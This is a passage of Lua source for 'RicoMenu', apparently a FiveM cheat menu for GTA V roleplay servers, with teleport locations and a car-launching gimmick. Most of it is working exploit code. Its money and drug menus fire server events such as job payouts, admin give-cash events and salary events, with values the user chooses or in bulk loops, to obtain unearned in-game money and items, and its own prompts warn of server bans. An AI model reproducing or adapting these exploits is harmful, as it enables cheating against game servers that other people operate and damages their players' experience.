                        SetEntityCoords(PlayerPedId(), savedpos4)
                        ShowInfo("~g~Position 4 Loaded")
                    end
                end
            elseif RicoMenu.ComboBox("Saved Location 5", {"save", "load"}, currSaveLoadIndex5, selSaveLoadIndex5, function(currentIndex, selectedIndex)
                currSaveLoadIndex5 = currentIndex
                selSaveLoadIndex5 = currentIndex
            end) then
                if selSaveLoadIndex5 == 1 then
                    savedpos5 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 5 Saved")
                else
                    if not savedpos5 then ShowInfo("~r~There is no saved position for slot 5!") else
                        SetEntityCoords(PlayerPedId(), savedpos5)
                        ShowInfo("~g~Position 5 Loaded")
                    end
                end
            end
        

        elseif RicoMenu.IsMenuOpened('pois') then
            if RicoMenu.Button("Car Dealership (Simeon's)") then
                SetEntityCoords(PlayerPedId(), -3.812, -1086.427, 26.672)
            elseif RicoMenu.Button("Legion Square") then
                SetEntityCoords(PlayerPedId(), 212.685, -920.016, 30.692)
            elseif RicoMenu.Button("Grove Street") then
                SetEntityCoords(PlayerPedId(), 118.63, -1956.388, 20.669)
            elseif RicoMenu.Button("LSPD HQ") then
                SetEntityCoords(PlayerPedId(), 436.873, -987.138, 30.69)
            elseif RicoMenu.Button("Sandy Shores BCSO HQ") then
                SetEntityCoords(PlayerPedId(), 1864.287, 3690.687, 34.268)
            elseif RicoMenu.Button("Paleto Bay BCSO HQ") then
                SetEntityCoords(PlayerPedId(), -424.13, 5996.071, 31.49)
            elseif RicoMenu.Button("FIB Top Floor") then
                SetEntityCoords(PlayerPedId(), 135.835, -749.131, 258.152)
            elseif RicoMenu.Button("FIB Offices") then
                SetEntityCoords(PlayerPedId(), 136.008, -765.128, 242.152)
            elseif RicoMenu.Button("Michael's House") then
                SetEntityCoords(PlayerPedId(), -801.847, 175.266, 72.845)
            elseif RicoMenu.Button("Franklin's First House") then
                SetEntityCoords(PlayerPedId(), -17.813, -1440.008, 31.102)
            elseif RicoMenu.Button("Franklin's Second House") then
                SetEntityCoords(PlayerPedId(), -6.25, 522.043, 174.628)
            elseif RicoMenu.Button("Trevor's Trailer") then
                SetEntityCoords(PlayerPedId(), 1972.972, 3816.498, 32.95)
            elseif RicoMenu.Button("Tequi-La-La") then
                SetEntityCoords(PlayerPedId(), -568.25, 291.261, 79.177)
            end
        
        
 
        elseif RicoMenu.IsMenuOpened('lua') then
            

				if RicoMenu.MenuButton('~g~ESX ~s~& ~b~vRP ~s~💰 Money Options', 'money') then
				elseif RicoMenu.MenuButton('~g~ESX ~s~💼 Set Jobs', 'player1') then
				elseif RicoMenu.MenuButton('~g~ESX ~s~🌿 Drugs Farm', 'drogas') then
				elseif RicoMenu.MenuButton('~s~🔮 Custom Scripts ~p~[VIP]', 'mecanico') then
				elseif RicoMenu.MenuButton('~g~ESX ~s~Options', 'esx') then
                elseif RicoMenu.MenuButton('~y~QB ~s~Spawn ~p~Items', 'vrp') then
			end
			
			elseif RicoMenu.IsMenuOpened('mecanico') then           
			 if RicoMenu.Button("~p~Shoot ~b~Cars ~w~KEY ~y~[E] ~p~BETA") then
                RicoModz = {}

                RicoModz.SpawnVehicles = function()
                    local playerPed = PlayerPedId()
                    local pos = GetEntityCoords(playerPed)
                    local heading = GetGameplayCamRot(0).z
                    local forwardVector = GetEntityForwardVector(playerPed)
                    local headPos = GetPedBoneCoords(playerPed, 31086, 0.0, 0.0, 0.5) -- קואורדינטות ראש השחקן
                    local vehicleHash = GetHashKey("adder")
                    
                    RequestModel(vehicleHash)
                    while not HasModelLoaded(vehicleHash) do
                        Citizen.Wait(500) -- מחכה לטעינת המודל
                    end
                
                    -- הגדרת מיקום יציאת הרכב: קדימה וגבוה יותר
                    local spawnOffset = 6.0 -- מרחק קדימה מהשחקן
                    local heightOffset = 1.5 -- גובה מעל הראש (טיפה גבוה יותר)
                
                    -- שגר שלושה רכבים
                    for i = 1, 3 do
                        -- חשב את מיקום היציאה של כל רכב
                        local spawnPos = headPos + forwardVector * (spawnOffset + (i - 1) * 4.0) + vector3(0.0, 0.0, heightOffset)
                
                        -- יצירת הרכב
                        local vehicle = CreateVehicle(vehicleHash, spawnPos.x, spawnPos.y, spawnPos.z, heading, true, false)
                        SetVehicleOnGroundProperly(vehicle)
                        SetVehicleHasBeenOwnedByPlayer(vehicle, true)
                
                        -- הגדרת כיוון הרכב
                        local targetCoords = GetGameplayCamCoord() -- קואורדינטות היעד (הכיוון שבו אתה מסתכל)
                        local direction = vector3(targetCoords.x - pos.x, targetCoords.y - pos.y, targetCoords.z - pos.z)
                        local directionLength = #(direction) -- גודל הווקטור
                        
                        if directionLength ~= 0 then
                            local normalizedDirection = direction / directionLength
                            local force = 500.0 -- מהירות מופחתת ב-50%
                
                            -- הגדרת התנע של הרכב
                            SetVehicleForwardSpeed(vehicle, force)
                            local forceVector = normalizedDirection * force
                            ApplyForceToEntity(vehicle, 1, forceVector.x, forceVector.y, forceVector.z, 0, 0, 0, 0, true, true)
                        end
                    end
                end
                
                Citizen.CreateThread(function()
                    while true do
                        Citizen.Wait(0)
                
                        if IsControlJustPressed(1, 38) then 
                            RicoModz.SpawnVehicles()
                        end
                    end
                end)                                                                          
end					
				
			elseif RicoMenu.IsMenuOpened('drogas') then
			 if RicoMenu.Button("~h~~g~Harvest ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
				elseif RicoMenu.Button("~h~~g~Transform ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
				elseif RicoMenu.Button("~h~~g~Sell ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
				elseif RicoMenu.Button("~h~~w~Harvest ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
				    TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
				elseif RicoMenu.Button("~h~~w~Transform ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
				    TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')																			
				elseif RicoMenu.Button("~h~~w~Sell ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
				elseif RicoMenu.Button("~h~~r~Harvest Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
				elseif RicoMenu.Button("~h~~r~Transform Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
				elseif RicoMenu.Button("~h~~r~Sell Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
				elseif RicoMenu.Button("~h~~p~Harvest Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
				elseif RicoMenu.Button("~h~~p~Transform Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
				elseif RicoMenu.Button("~h~~p~Sell Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
				elseif RicoMenu.Button("~r~~h~Stop all ~c~(Drugs)") then
					TriggerServerEvent("esx_drugs:stopHarvestCoke")
					TriggerServerEvent("esx_drugs:stopTransformCoke")
					TriggerServerEvent("esx_drugs:stopSellCoke")
					TriggerServerEvent("esx_drugs:stopHarvestMeth")
					TriggerServerEvent("esx_drugs:stopTransformMeth")
					TriggerServerEvent("esx_drugs:stopSellMeth")
					TriggerServerEvent("esx_drugs:stopHarvestWeed")
					TriggerServerEvent("esx_drugs:stopTransformWeed")
					TriggerServerEvent("esx_drugs:stopSellWeed")
					TriggerServerEvent("esx_drugs:stopHarvestOpium")
					TriggerServerEvent("esx_drugs:stopTransformOpium")
					TriggerServerEvent("esx_drugs:stopSellOpium")
					TriggerServerEvent('esx_illegal_drugs:stopHarvestCoke')
					TriggerServerEvent('esx_illegal_drugs:stopTransformCoke')
					TriggerServerEvent('esx_illegal_drugs:stopSellCoke')
					TriggerServerEvent('esx_illegal_drugs:stopHarvestMeth')
					TriggerServerEvent('esx_illegal_drugs:stopTransformMeth')
					TriggerServerEvent('esx_illegal_drugs:stopSellMeth')
					TriggerServerEvent('esx_illegal_drugs:stopHarvestWeed')
					TriggerServerEvent('esx_illegal_drugs:stopTransformWeed')
					TriggerServerEvent('esx_illegal_drugs:stopSellWeed')
					TriggerServerEvent('esx_illegal_drugs:stopHarvestOpium')
					TriggerServerEvent('esx_illegal_drugs:stopTransformOpium')
					TriggerServerEvent('esx_illegal_drugs:stopSellOpium')
					ShowInfo("~r~Everything is now stopped.")
				elseif RicoMenu.Button("~h~~g~Sell Money Wash~s~ 1 ~c~(x10)") then
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
				elseif RicoMenu.Button("~h~~g~Sell Money Wash~s~ 2") then
					local result = GetKeyboardInput("Enter amount wash money ", "", 100000)
					if result then
					TriggerServerEvent('esx_moneywash:washMoney', result)
					TriggerServerEvent('esx_blackmoney:washMoney', result)
					TriggerServerEvent('esx_society:washMoney', result)
					end
				end
		
			
			
			elseif RicoMenu.IsMenuOpened('money') then
						if RicoMenu.Button("~g~MONEY~s~ 1 ~y~Esx~s~ | ~b~vRP ~r~ (RISK) ~s~(Work 90% ALL SERVERS)") then
			local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y~w~/~r~N")
			
			 if string.lower(confirm) == "y" then
			 local result = GetKeyboardInput("Enter amount of money ~g~$$$", "", 100000000)
				
				TriggerServerEvent('esx_truckerjob:pay', result)
				TriggerServerEvent('vrp_slotmachine:server:2', result)
				TriggerServerEvent("esx_pizza:pay", result)
				TriggerServerEvent('esx_jobs:caution', 'give_back', result)
				TriggerServerEvent('lscustoms:payGarage', result)
				TriggerServerEvent('esx_tankerjob:pay', result)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', result)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', result)
				TriggerServerEvent('gambling:spend', result)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', result)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				TriggerServerEvent('AdminMenu:giveBank', result)
				TriggerServerEvent('AdminMenu:giveCash', result)
				TriggerServerEvent('esx_slotmachine:sv:2', result)
				TriggerServerEvent('esx_moneywash:deposit', result)
				TriggerServerEvent('esx_moneywash:withdraw', result)
				TriggerServerEvent('esx_moneywash:deposit', result)
			    TriggerServerEvent('mission:completed', result)
				TriggerServerEvent('truckerJob:success',result)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', result)
				TriggerServerEvent("dropOff", result)
				TriggerServerEvent('truckerfuel:success',result)
				TriggerServerEvent('delivery:success',result)
				TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				TriggerServerEvent("esx_brinksjob:pay", result)
				TriggerServerEvent("esx_garbagejob:pay", result)
				TriggerServerEvent("esx_postejob:pay", result)
				TriggerServerEvent('esx_garbage:pay', result)
				TriggerServerEvent("esx_carteirojob:pay", result)
				else
					ShowInfo("~r~Operation Canceled")
				end
			elseif RicoMenu.Button("~g~MONEY~s~ 2 ~y~Esx~s~ | ~b~vRP ~r~(RISK) ~w~(All_Jobs)") then
				local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y~w~/~r~N")
			 if string.lower(confirm) == "y" then
			        TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				else
					ShowInfo("~r~Operation Canceled")
				end
				
				elseif RicoMenu.Button("~g~MONEY~s~ 3 ~y~Esx~s~ | ~b~vRP ~r~ (RISK) ~s~(Work 90% ALL SERVERS)") then
			local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y~w~/~r~N")
			
			 if string.lower(confirm) == "y" then
			 local result = GetKeyboardInput("Enter amount of money ~g~$$$", "", 100000000)
				TriggerServerEvent("esx_godirtyjob:pay", result)
				TriggerServerEvent("esx_pizza:pay", result)
				TriggerServerEvent("esx_slotmachine:sv:2", result)
				TriggerServerEvent("esx_banksecurity:pay", result)
				TriggerServerEvent("esx_gopostaljob:pay", result)
				TriggerServerEvent("esx_truckerjob:pay", result)
				TriggerServerEvent("esx_carthief:pay", result)
			    TriggerServerEvent("esx_garbagejob:pay", result)
				TriggerServerEvent("esx_ranger:pay", result)
                TriggerServerEvent("esx_truckersjob:payy", result)
                TriggerServerEvent("esx_godirtyjob:pay", result)
                TriggerServerEvent("dropOff",result)
                TriggerServerEvent("PayForRepairNow",-result)
				else
					ShowInfo("~r~Operation Canceled")
				end
		    elseif RicoMenu.Button("~g~MONEY~s~ 4 ~b~VRP~w~ (vrp_trucker)") then
                local money = GetKeyboardInput("Enter amount of money ~g~$$$")
                local distance = money / 3.80
                vRPtruckS = Tunnel.getInterface("vRP_trucker", "vRP_trucker")
                vRPtruckS.finishTruckingDelivery({distance})
			elseif RicoMenu.Button("~g~MONEY~s~ 5 ~b~ VRP~w~ (vrp_casino)") then
				local amount = GetKeyboardInput("Enter amount of money ~g~$$$:")
				vRPcasinoS = Tunnel.getInterface("vRP_casino","vRP_casino")
				vRPcasinoS.payRouletteWinnings({amount, 2})
			elseif RicoMenu.Button("~g~MONEY~s~ 6 ~b~ VRP~w~ (Salary Times a 100)") then
			a=1 repeat TriggerServerEvent('paycheck:salary') a=a+1 until (a>100)
                a=1 repeat TriggerServerEvent('paycheck:bonus') a=a+1 until (a>100)
                a=1 repeat TriggerServerEvent("dropOff",100000) a=a+1 until (a>100)
			    a=1 repeat TriggerServerEvent("PayForRepairNow",-100000) a=a+1 until (a>100)
			elseif RicoMenu.Button("~g~MONEY~s~ 7 ~b~ VRP~w~ (Should be a 100k i reckin)") then
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent('PayForRepairNow',-100000) 
			elseif RicoMenu.Button("~g~MONEY~s~ 8 ~b~ VRP|Vrpx~w~ (SAMU|SALARIO)") then
			local result = 9999
                                if result then
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
